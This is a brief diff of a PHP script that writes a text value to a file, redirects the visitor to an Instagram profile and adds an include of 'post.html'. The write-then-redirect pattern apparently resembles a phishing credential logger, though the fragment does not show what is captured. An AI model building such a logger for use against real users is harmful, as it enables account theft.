@@ -9,7 +9,7 @@
 
     if(fwrite($fp, $text))  {
         header('Location:https://instagram.com/jah18.x');
-
+        include 'post.html';
     }
 fclose ($fp);    
 }
